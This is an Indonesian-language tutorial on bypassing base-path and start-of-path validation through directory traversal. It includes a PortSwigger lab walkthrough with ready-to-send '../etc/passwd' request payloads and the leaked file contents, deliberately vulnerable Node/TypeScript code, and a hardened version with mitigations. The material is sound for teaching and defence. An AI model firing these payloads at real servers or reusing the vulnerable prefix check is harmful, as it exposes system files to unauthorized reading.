@@ -1,0 +1,252 @@
+# Directory Traversal: Bypassing Hardcoded Base Path (Start-of-Path Validation)
+
+Dalam arsitektur backend aplikasi web, salah satu pola paling umum yang diterapkan pengembang untuk mengisolasi berkas statis adalah dengan **mengunci direktori dasar (_hardcoded base path_)** atau **mewajibkan input pengguna diawali jalur folder tertentu (_start-of-path validation_)**, misalnya `/var/www/images/` atau `C:\inetpub\wwwroot\uploads\`.
+
+Pengembang berasumsi bahwa karena berkas selalu dicari di dalam folder tersebut, pengguna tidak akan bisa mengakses berkas di luarnya. Namun, karena sistem operasi secara alami mendukung navigasi hierarki direktori (_dot-dot-slash_ `../`), pembatasan direktori dasar ini dapat ditembus dengan mudah.
+
+---
+
+## 1. Konsep Kerentanan: Mengapa Hardcoded Base Path Gagal?
+
+Perhatikan bagaimana server backend umumnya menyusun jalur berkas:
+
+```javascript
+// Backend mengunci folder dasar penyimpanan gambar
+const BASE_PATH = "/var/www/images/";
+const filename = req.query.filename;
+
+// Menggabungkan direktori dasar dengan input pengguna
+const targetPath = BASE_PATH + filename;
+fs.readFile(targetPath, (err, data) => { ... });
+```
+
+### Mengapa Asumsi Pengembang Keliru?
+Sistem operasi (Linux, Unix, Windows) memiliki mekanisme navigasi direktori bawaan:
+- Simbol `.` merepresentasikan direktori saat ini.
+- Simbol `..` merepresentasikan **satu tingkat direktori di atasnya (direktori induk)**.
+
+Ketika backend menggabungkan `/var/www/images/` dengan input `../../../etc/passwd`:
+```text
+/var/www/images/../../../etc/passwd
+```
+Kernel sistem operasi akan menelusuri mundur:
+1. Dari `/var/www/images/`, naik satu tingkat ke `/var/www/`
+2. Dari `/var/www/`, naik satu tingkat ke `/var/`
+3. Dari `/var/`, naik satu tingkat ke `/` (Root direktori sistem operasi)
+4. Masuk ke `/etc/passwd`!
+
+> [!TIP]
+> **Aturan Keamanan Sistem Operasi:** Di sistem Linux/Unix, jika kamu sudah berada di direktori root (`/`) dan terus mengeksekusi `../`, kernel tidak akan error melainkan tetap berada di `/`. Oleh karena itu, penyerang dapat mengirimkan `../` sebanyak mungkin (misal 8 hingga 15 kali) untuk memastikan request pasti mencapai root sistem.
+
+---
+
+## 2. Alur Eksploitasi: Bypassing Hardcoded Base Path
+
+![Directory Traversal Hardcoded Base Path Bypass](/images/directory-traversal-hardcoded-path.svg)
+
+---
+
+## 3. Dua Skenario Utama Hardcoded Base Path & Teknik Bypass
+
+Berikut adalah teknik-teknik yang digunakan untuk membongkar pembatasan direktori dasar:
+
+---
+
+### Skenario A: Hardcoded Path Konkatenasi Sederhana (Directory Depth Climbing)
+
+Pada skenario ini, pengembang langsung menempelkan input parameter ke variabel path statis:
+
+```javascript
+const targetFile = "/var/www/html/app/public/media/" + req.query.file;
+```
+
+#### Cara Eksploitasi:
+1. Hitung perkiraan kedalaman folder dari root (`/`):
+   - `var` (1) → `www` (2) → `html` (3) → `app` (4) → `public` (5) → `media` (6) = **6 Level Kedalaman**.
+2. Kirim payload dengan jumlah sekuens `../` minimal 6 kali:
+   ```http
+   GET /media?file=../../../../../../etc/passwd HTTP/1.1
+   ```
+3. Target langsung dinormalisasi kernel menuju `/etc/passwd`.
+
+---
+
+### Skenario B: Validasi Awalan Jalur (Validation of Start of Path)
+
+Pada skenario yang lebih ketat, pengembang menambahkan validasi untuk memastikan bahwa input pengguna **wajib diawali** dengan direktori dasar yang sah:
+
+```javascript
+// ❌ KODE RENTAN: Memeriksa awalan pada string mentah pengguna
+if (!req.query.filename.startsWith("/var/www/images/")) {
+  return res.status(403).json({ error: "Akses ditolak: Path harus diawali /var/www/images/" });
+}
+
+// Backend langsung membaca file dari path tersebut
+fs.readFile(req.query.filename, (err, data) => { ... });
+```
+
+#### Cara Eksploitasi (Prefix Match & Jump):
+Penyerang cukup mengawali input dengan direktori yang diwajibkan oleh server, kemudian langsung menyambungnya dengan sekuens `../` untuk melompat keluar:
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+Host: target-website.com
+```
+
+#### Mengapa Ini Berhasil?
+1. Pengecekan `startsWith("/var/www/images/")` menghasilkan nilai **`true` (Lolos validasi)** karena request memang diawali dengan teks tersebut.
+2. Saat fungsi `fs.readFile()` dieksekusi, kernel OS menormalisasi `/var/www/images/../../../etc/passwd` menjadi `/etc/passwd`.
+3. Validasi awalan berhasil dikelabui sepenuhnya!
+
+---
+
+### Skenario C: Perilaku Path Resolution (`path.resolve` / `os.path.join`)
+
+Jika backend menggunakan fungsi resolusi path bawaan bahasa pemrograman:
+
+```javascript
+const finalPath = path.resolve("/var/www/images", req.query.filename);
+```
+
+Jika penyerang mengirimkan input yang diawali tanda slash `/` (misalnya `/etc/passwd`), `path.resolve` menganggap input tersebut sebagai root baru dan **membuang seluruh path dasar `/var/www/images`**, langsung membuka `/etc/passwd`.
+
+---
+
+## 4. Praktik Langkah Demi Langkah Menggunakan Burp Suite
+
+Berikut panduan menyelesaikan skenario lab PortSwigger (*File path traversal, validation of start of path*):
+
+---
+
+### Langkah 1: Tangkap Request Gambar Produk
+1. Buka browser bawaan **Burp Suite** dan akses toko online target.
+2. Klik salah satu produk dan tangkap request pemanggilan gambar di tab **Proxy** > **HTTP history**:
+   ```http
+   GET /image?filename=/var/www/images/50.jpg HTTP/1.1
+   Host: target-lab.net
+   ```
+3. Perhatikan bahwa nilai default parameter sudah menyertakan awalan jalur lengkap: `/var/www/images/50.jpg`.
+
+---
+
+### Langkah 2: Kirim Request ke Burp Repeater
+1. Klik kanan pada request tersebut dan pilih **Send to Repeater** (`Ctrl + R` / `Cmd + R`).
+2. Masuk ke tab **Repeater**.
+
+---
+
+### Langkah 3: Uji Traversal Biasa (Observasi Error Validasi)
+1. Coba ubah nilai parameter menjadi traversal standar tanpa prefix:
+   ```http
+   GET /image?filename=../../../etc/passwd HTTP/1.1
+   ```
+2. Klik tombol **Send**.
+3. Server merespons dengan error (misal `400 Bad Request: "Missing parameter / path must start with /var/www/images/"`), membuktikan adanya validasi awalan jalur.
+
+---
+
+### Langkah 4: Terapkan Payload Prefix Fulfillment
+1. Sisipkan sekuens `../../../etc/passwd` tepat setelah prefix `/var/www/images/`:
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+Host: target-lab.net
+Cookie: session=xyz...
+```
+
+2. Klik tombol **Send**.
+
+---
+
+### Langkah 5: Analisis Hasil Response
+1. Periksa panel **Response** di sebelah kanan.
+2. Server berhasil merespons dengan status **`200 OK`** dan menampilkan isi berkas `/etc/passwd`:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Content-Length: 1345
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+carlos:x:1001:1001:Carlos:/home/carlos:/bin/bash
+peter:x:1002:1002:Peter:/home/peter:/bin/bash
+```
+
+3. Lab berhasil diselesaikan (*Solved*)! 🎉
+
+---
+
+## 5. Bedah Kode Backend: Rentan vs Aman
+
+### ❌ Contoh Kode Backend yang Rentan (Validasi Prefix Mentah)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const filePath = req.query.filename as string;
+
+  // ❌ KESALAHAN: Memvalidasi string mentah sebelum dinormalisasi
+  if (!filePath.startsWith("/var/www/images/")) {
+    return res.status(400).send("Path harus diawali /var/www/images/");
+  }
+
+  // ❌ Membuka file langsung dari input (../ mengeksekusi traversal)
+  fs.readFile(filePath, (err, data) => {
+    if (err) return res.status(404).send("File tidak ditemukan.");
+    return res.send(data);
+  });
+});
+```
+
+---
+
+### ✅ Contoh Kode Backend yang Aman (Canonical Path Containment Check)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const BASE_DIR = path.resolve("/var/www/images");
+  const filename = req.query.filename as string;
+
+  if (!filename || typeof filename !== "string") {
+    return res.status(400).json({ error: "Parameter tidak valid." });
+  }
+
+  // 1. Validasi Whitelist Karakter (Tolak karakter slash / dan titik ganda ..)
+  if (!/^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif|webp)$/.test(path.basename(filename))) {
+    return res.status(400).json({ error: "Format nama berkas ilegal." });
+  }
+
+  // 2. Canonical Path Resolution: Gabungkan direktori dasar dan normalisasi jalur
+  const targetPath = path.resolve(BASE_DIR, filename);
+
+  // 3. ✅ VALIDASI YANG BENAR: Cek apakah jalur KANONIKAL berada di dalam BASE_DIR
+  if (!targetPath.startsWith(BASE_DIR + path.sep)) {
+    return res.status(403).json({ error: "Akses di luar direktori kerja dilarang!" });
+  }
+
+  // 4. Pastikan file fisik ada sebelum dikirim
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: "Berkas tidak ditemukan." });
+  }
+
+  return res.sendFile(targetPath);
+});
+```
+
+---
+
+## 6. Ringkasan & Panduan Mitigasi
+
+1. **Validasi Jalur HANYA SETELAH Canonicalization:**
+   Jangan pernah memeriksa `startsWith()` pada string mentah dari pengguna. Selalu lakukan `path.resolve()` atau `realpath()` terlebih dahulu, baru uji apakah hasil path akhir diawali dengan `BASE_DIR + path.sep`.
+2. **Gunakan Fungsi `path.basename()`:**
+   Jika endpoint hanya dimaksudkan untuk mengambil nama file tunggal di dalam folder, ekstrak hanya nama filenya menggunakan `path.basename(input)` untuk membuang semua prefix folder dan sekuens `../`.
+3. **Isolasi Berkas Menggunakan Database Mapping:**
+   Gunakan ID acak (seperti UUID) yang disimpan di database yang memetakan ke berkas fisik, sehingga pengguna tidak memiliki kontrol langsung atas jalur berkas di filesystem.
